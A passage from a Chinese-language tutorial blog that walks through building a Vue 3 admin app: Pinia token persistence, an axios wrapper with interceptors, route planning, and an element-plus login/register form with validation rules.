下的文件也会被自动注册~</p><h2 id="Pinia-构建用户仓库-和-持久化"><a href="#Pinia-构建用户仓库-和-持久化" class="headerlink" title="Pinia - 构建用户仓库 和 持久化"></a>Pinia - 构建用户仓库 和 持久化</h2><p>官方文档：<a href="https://prazdevs.github.io/pinia-plugin-persistedstate/zh/">https://prazdevs.github.io/pinia-plugin-persistedstate/zh/</a></p><ol><li>安装插件 pinia-plugin-persistedstate</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">pnpm add pinia-plugin-persistedstate -D</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>使用 main.js</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> persist <span class="keyword">from</span> <span class="string">'pinia-plugin-persistedstate'</span></span><br><span class="line">...</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">createPinia</span>().<span class="title function_">use</span>(persist))</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>配置 stores/user.js</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { defineStore } <span class="keyword">from</span> <span class="string">'pinia'</span></span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户模块</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useUserStore = <span class="title function_">defineStore</span>(</span><br><span class="line">  <span class="string">'big-user'</span>,</span><br><span class="line">  <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> token = <span class="title function_">ref</span>(<span class="string">''</span>) <span class="comment">// 定义 token</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">setToken</span> = (<span class="params">t</span>) =&gt; (token.<span class="property">value</span> = t) <span class="comment">// 设置 token</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> { token, setToken }</span><br><span class="line">  },</span><br><span class="line">  {</span><br><span class="line">    <span class="attr">persist</span>: <span class="literal">true</span> <span class="comment">// 持久化</span></span><br><span class="line">  }</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Pinia-配置仓库统一管理"><a href="#Pinia-配置仓库统一管理" class="headerlink" title="Pinia - 配置仓库统一管理"></a>Pinia - 配置仓库统一管理</h2><p>pinia 独立维护</p><p>- 现在：初始化代码在 main.js 中，仓库代码在 stores 中，代码分散职能不单一</p><p>- 优化：由 stores 统一维护，在 stores/index.js 中完成 pinia 初始化，交付 main.js 使用</p><p>仓库 统一导出</p><p>- 现在：使用一个仓库 import { useUserStore } from <code>./stores/user.js</code> 不同仓库路径不一致</p><p>- 优化：由 stores/index.js 统一导出，导入路径统一 <code>./stores</code>，而且仓库维护在 stores/modules 中</p><h2 id="数据交互-请求工具设计"><a href="#数据交互-请求工具设计" class="headerlink" title="数据交互 - 请求工具设计"></a>数据交互 - 请求工具设计</h2><h3 id="1-创建-axios-实例"><a href="#1-创建-axios-实例" class="headerlink" title="1. 创建 axios 实例"></a>1. 创建 axios 实例</h3><p>们会使用 axios 来请求后端接口, 一般都会对 axios 进行一些配置 (比如: 配置基础地址等)</p><p>一般项目开发中, 都会对 axios 进行基本的二次封装, 单独封装到一个模块中, 便于使用</p><ol><li>安装 axios</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pnpm add axios</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li><p>新建 <code>utils/request.js</code> 封装 axios 模块</p><p>利用 axios.create 创建一个自定义的 axios 来使用</p><p><a href="http://www.axios-js.com/zh-cn/docs/#axios-create-config">http://www.axios-js.com/zh-cn/docs/#axios-create-config</a></p></li></ol><figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> baseURL = <span class="string">'http://big-event-vue-api-t.itheima.net'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> instance = axios.<span class="title function_">create</span>({</span><br><span class="line">  <span class="comment">// TODO 1. 基础地址，超时时间</span></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="function">(<span class="params">config</span>) =&gt;</span> {</span><br><span class="line">    <span class="comment">// TODO 2. 携带token</span></span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  },</span><br><span class="line">  <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(err)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="function">(<span class="params">res</span>) =&gt;</span> {</span><br><span class="line">    <span class="comment">// TODO 3. 处理业务失败</span></span><br><span class="line">    <span class="comment">// TODO 4. 摘取核心响应数据</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  },</span><br><span class="line">  <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">    <span class="comment">// TODO 5. 处理401错误</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(err)</span><br><span class="line">  }</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> instance</span><br></pre></td></tr></tbody></table></figure><h3 id="2-完成-axios-基本配置"><a href="#2-完成-axios-基本配置" class="headerlink" title="2. 完成 axios 基本配置"></a>2. 完成 axios 基本配置</h3><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { useUserStore } <span class="keyword">from</span> <span class="string">'@/stores/user'</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'@/router'</span></span><br><span class="line"><span class="keyword">import</span> { <span class="title class_">ElMessage</span> } <span class="keyword">from</span> <span class="string">'element-plus'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> baseURL = <span class="string">'http://big-event-vue-api-t.itheima.net'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> instance = axios.<span class="title function_">create</span>({</span><br><span class="line">  baseURL,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">100000</span></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="function">(<span class="params">config</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> userStore = <span class="title function_">useUserStore</span>()</span><br><span class="line">    <span class="keyword">if</span> (userStore.<span class="property">token</span>) {</span><br><span class="line">      config.<span class="property">headers</span>.<span class="property">Authorization</span> = userStore.<span class="property">token</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  },</span><br><span class="line">  <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(err)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="function">(<span class="params">res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (res.<span class="property">data</span>.<span class="property">code</span> === <span class="number">0</span>) {</span><br><span class="line">      <span class="keyword">return</span> res</span><br><span class="line">    }</span><br><span class="line">    <span class="title class_">ElMessage</span>({ <span class="attr">message</span>: res.<span class="property">data</span>.<span class="property">message</span> || <span class="string">'服务异常'</span>, <span class="attr">type</span>: <span class="string">'error'</span> })</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(res.<span class="property">data</span>)</span><br><span class="line">  },</span><br><span class="line">  <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">    <span class="title class_">ElMessage</span>({ <span class="attr">message</span>: err.<span class="property">response</span>.<span class="property">data</span>.<span class="property">message</span> || <span class="string">'服务异常'</span>, <span class="attr">type</span>: <span class="string">'error'</span> })</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">    <span class="keyword">if</span> (err.<span class="property">response</span>?.<span class="property">status</span> === <span class="number">401</span>) {</span><br><span class="line">      router.<span class="title function_">push</span>(<span class="string">'/login'</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(err)</span><br><span class="line">  }</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> instance</span><br><span class="line"><span class="keyword">export</span> { baseURL }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="首页整体路由设计"><a href="#首页整体路由设计" class="headerlink" title="首页整体路由设计"></a>首页整体路由设计</h2><p><strong>实现目标:</strong></p><ul><li>完成整体路由规划【搞清楚要做几个页面，它们分别在哪个路由下面，怎么跳转的…..】</li><li>通过观察,  点击左侧导航,  右侧区域在切换,  那右侧区域内容一直在变,  那这个地方就是一个路由的出口</li><li>我们需要搭建嵌套路由</li></ul><p>目标：</p><ul><li>把项目中所有用到的组件及路由表, 约定下来</li></ul><p><strong>约定路由规则</strong></p><table><thead><tr><th>path</th><th>文件</th><th>功能</th><th>组件名</th><th>路由级别</th></tr></thead><tbody><tr><td>/login</td><td>views/login/LoginPage.vue</td><td>登录&amp;注册</td><td>LoginPage</td><td>一级路由</td></tr><tr><td>/</td><td>views/layout/LayoutContainer.vue</td><td>布局架子</td><td>LayoutContainer</td><td>一级路由</td></tr><tr><td>├─ /article/manage</td><td>views/article/ArticleManage.vue</td><td>文章管理</td><td>ArticleManage</td><td>二级路由</td></tr><tr><td>├─ /article/channel</td><td>views/article/ArticleChannel.vue</td><td>频道管理</td><td>ArticleChannel</td><td>二级路由</td></tr><tr><td>├─ /user/profile</td><td>views/user/UserProfile.vue</td><td>个人详情</td><td>UserProfile</td><td>二级路由</td></tr><tr><td>├─ /user/avatar</td><td>views/user/UserAvatar.vue</td><td>更换头像</td><td>UserAvatar</td><td>二级路由</td></tr><tr><td>├─ /user/password</td><td>views/user/UserPassword.vue</td><td>重置密码</td><td>UserPassword</td><td>二级路由</td></tr></tbody></table><p>明确了路由规则，可以全部配完，也可以边写边配。</p><h1 id="登录注册页面-element-plus-表单-表单校验"><a href="#登录注册页面-element-plus-表单-表单校验" class="headerlink" title="登录注册页面 [element-plus 表单 &amp; 表单校验]"></a>登录注册页面 [element-plus 表单 &amp; 表单校验]</h1><h2 id="注册登录-静态结构-基本切换"><a href="#注册登录-静态结构-基本切换" class="headerlink" title="注册登录 静态结构 &amp; 基本切换"></a>注册登录 静态结构 &amp; 基本切换</h2><ol><li>安装 element-plus 图标库</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">pnpm i @element-plus/icons-vue</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>静态结构准备</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> { <span class="title class_">User</span>, <span class="title class_">Lock</span> } <span class="keyword">from</span> <span class="string">'@element-plus/icons-vue'</span></span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">const</span> isRegister = <span class="title function_">ref</span>(<span class="literal">true</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-row</span> <span class="attr">class</span>=<span class="string">"login-page"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">"12"</span> <span class="attr">class</span>=<span class="string">"bg"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">"6"</span> <span class="attr">:offset</span>=<span class="string">"3"</span> <span class="attr">class</span>=<span class="string">"form"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">"form"</span> <span class="attr">size</span>=<span class="string">"large"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">v-if</span>=<span class="string">"isRegister"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">:prefix-icon</span>=<span class="string">"User"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">:prefix-icon</span>=<span class="string">"Lock"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">type</span>=<span class="string">"password"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">:prefix-icon</span>=<span class="string">"Lock"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">type</span>=<span class="string">"password"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">placeholder</span>=<span class="string">"请输入再次密码"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"primary"</span> <span class="attr">auto-insert-space</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            注册</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">class</span>=<span class="string">"flex"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-link</span> <span class="attr">type</span>=<span class="string">"info"</span> <span class="attr">:underline</span>=<span class="string">"false"</span> @<span class="attr">click</span>=<span class="string">"isRegister = false"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            ← 返回</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">"form"</span> <span class="attr">size</span>=<span class="string">"large"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">v-else</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">:prefix-icon</span>=<span class="string">"User"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">name</span>=<span class="string">"password"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">:prefix-icon</span>=<span class="string">"Lock"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">type</span>=<span class="string">"password"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">class</span>=<span class="string">"flex"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"flex"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-checkbox</span>&gt;</span>记住我<span class="tag">&lt;/<span class="name">el-checkbox</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-link</span> <span class="attr">type</span>=<span class="string">"primary"</span> <span class="attr">:underline</span>=<span class="string">"false"</span>&gt;</span>忘记密码？<span class="tag">&lt;/<span class="name">el-link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"primary"</span> <span class="attr">auto-insert-space</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            &gt;</span>登录&lt;/el-button</span></span><br><span class="line"><span class="language-xml">          &gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">class</span>=<span class="string">"flex"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-link</span> <span class="attr">type</span>=<span class="string">"info"</span> <span class="attr">:underline</span>=<span class="string">"false"</span> @<span class="attr">click</span>=<span class="string">"isRegister = true"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            注册 →</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"scss"</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-class">.login-page</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="selector-class">.bg</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'@/assets/logo2.png'</span>) no-repeat <span class="number">60%</span> center / <span class="number">240px</span> auto,</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="built_in">url</span>(<span class="string">'@/assets/login_bg.jpg'</span>) no-repeat center / cover;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">20px</span> <span class="number">20px</span> <span class="number">0</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="selector-class">.form</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">display</span>: flex;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">flex-direction</span>: column;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">justify-content</span>: center;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    user-<span class="selector-tag">select</span>: none;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.title</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.button</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">width</span>: <span class="number">100%</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.flex</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">width</span>: <span class="number">100%</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">display</span>: flex;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">justify-content</span>: space-between;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">}</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h2 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h2><h3 id="实现注册校验"><a href="#实现注册校验" class="headerlink" title="实现注册校验"></a>实现注册校验</h3><p>【需求】注册页面基本校验</p><ol><li>用户名非空，长度校验5-10位</li><li>密码非空，长度校验6-15位</li><li>再次输入密码，非空，长度校验6-15位</li></ol><p>【进阶】再次输入密码需要自定义校验规则，和密码框值一致（可选）</p><p>注意：</p><ol><li>model 属性绑定 form 数据对象</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formModel = <span class="title function_">ref</span>({</span><br><span class="line">  <span class="attr">username</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">repassword</span>: <span class="string">''</span></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">&lt;el-form :model=<span class="string">"formModel"</span> &gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>v-model 绑定 form 数据对象的子属性</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-input</span><br><span class="line">  v-model=<span class="string">"formModel.username"</span></span><br><span class="line">  :prefix-icon=<span class="string">"User"</span></span><br><span class="line">  placeholder=<span class="string">"请输入用户名"</span></span><br><span class="line">&gt;&lt;/el-input&gt;</span><br><span class="line">... </span><br><span class="line">(其他两个也要绑定)</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>rules 配置校验规则</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form :rules=<span class="string">"rules"</span> &gt;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">const</span> rules = {</span><br><span class="line">  <span class="attr">username</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请输入用户名'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    { <span class="attr">min</span>: <span class="number">5</span>, <span class="attr">max</span>: <span class="number">10</span>, <span class="attr">message</span>: <span class="string">'用户名必须是5-10位的字符'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> }</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">password</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请输入密码'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">pattern</span>: <span class="regexp">/^\S{6,15}$/</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">'密码必须是6-15位的非空字符'</span>,</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    }</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">repassword</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请再次输入密码'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">pattern</span>: <span class="regexp">/^\S{6,15}$/</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">'密码必须是6-15的非空字符'</span>,</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">validator</span>: <span class="function">(<span class="params">rule, value, callback</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (value !== formModel.<span class="property">value</span>.<span class="property">password</span>) {</span><br><span class="line">          <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">'两次输入密码不一致!'</span>))</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">          <span class="title function_">callback</span>()</span><br><span class="line">        }</span><br><span class="line">      },</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    }</span><br><span class="line">  ]</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>prop 绑定校验规则</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form-item prop=<span class="string">"username"</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">v-model</span>=<span class="string">"formModel.username"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">:prefix-icon</span>=<span class="string">"User"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  &gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line">&lt;/el-form-item&gt;</span><br><span class="line">... </span><br><span class="line">(其他两个也要绑定prop)</span><br></pre></td></tr></tbody></table></figure><h3 id="注册前的预校验"><a href="#注册前的预校验" class="headerlink" title="注册前的预校验"></a>注册前的预校验</h3><p>需求：点击注册按钮，注册之前，需要先校验</p><ol><li>通过 ref 获取到 表单组件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> form = <span class="title function_">ref</span>()</span><br><span class="line"></span><br><span 